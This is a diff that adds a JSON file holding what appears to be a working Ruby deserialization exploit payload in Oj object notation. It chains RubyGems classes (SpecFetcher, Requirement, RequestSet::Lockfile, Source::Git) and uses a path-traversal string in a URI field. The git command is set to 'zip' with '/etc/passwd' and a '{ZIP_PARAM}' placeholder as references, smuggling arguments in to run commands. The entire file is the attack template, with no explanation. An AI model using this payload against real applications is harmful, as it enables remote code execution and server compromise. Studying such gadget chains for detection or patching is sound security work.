@@ -1,0 +1,99 @@
+{
+    "^#1": [
+        [
+            {
+                "^c": "Gem::SpecFetcher"
+            },
+            {
+                "^o": "Gem::Requirement",
+                "requirements": [
+                    [
+                        "~>",
+                        {
+                            "^o": "Gem::RequestSet::Lockfile",
+                            "set": {
+                                "^o": "Gem::RequestSet",
+                                "sorted_requests": [
+                                    {
+                                        "^o": "Gem::Resolver::IndexSpecification",
+                                        "name": "name",
+                                        "source": {
+                                            "^o": "Gem::Source",
+                                            "uri": {
+                                                "^o": "URI::HTTP",
+                                                "path": "/",
+                                                "scheme": "s3",
+                                                "host": "rubygems.org/quick/Marshal.4.8/bundler-2.2.27.gemspec.rz?",
+                                                "port": "/../../../../../../../../../../../../../../../tmp/cache/bundler/git/any-c5fe0200d1c7a5139bd18fd22268c4ca8bf45e90/",
+                                                "user": "user",
+                                                "password": "password"
+                                            },
+                                            "update_cache": true
+                                        }
+                                    }
+                                ]
+                            },
+                            "dependencies": []
+                        }
+                    ]
+                ]
+            },
+            {
+                "^o": "Gem::Requirement",
+                "requirements": [
+                    [
+                        "~>",
+                        {
+                            "^o": "Gem::RequestSet::Lockfile",
+                            "set": {
+                                "^o": "Gem::RequestSet",
+                                "sorted_requests": [
+                                    {
+                                        "^o": "Gem::Resolver::SpecSpecification",
+                                        "spec": {
+                                            "^o": "Gem::Resolver::GitSpecification",
+                                            "source": {
+                                                "^o": "Gem::Source::Git",
+                                                "git": "zip",
+                                                "reference": "/etc/passwd",
+                                                "root_dir": "/tmp",
+                                                "repository": "any",
+                                                "name": "any"
+                                            },
+                                            "spec": {
+                                                "^o": "Gem::Resolver::Specification",
+                                                "name": "name",
+                                                "dependencies": []
+                                            }
+                                        }
+                                    },
+                                    {
+                                        "^o": "Gem::Resolver::SpecSpecification",
+                                        "spec": {
+                                            "^o": "Gem::Resolver::GitSpecification",
+                                            "source": {
+                                                "^o": "Gem::Source::Git",
+                                                "git": "zip",
+                                                "reference": "{ZIP_PARAM}",
+                                                "root_dir": "/tmp",
+                                                "repository": "any",
+                                                "name": "any"
+                                            },
+                                            "spec": {
+                                                "^o": "Gem::Resolver::Specification",
+                                                "name": "name",
+                                                "dependencies": []
+                                            }
+                                        }
+                                    }
+                                ]
+                            },
+                            "dependencies": []
+                        }
+                    ]
+                ]
+            }
+        ],
+        "any"
+    ]
+}
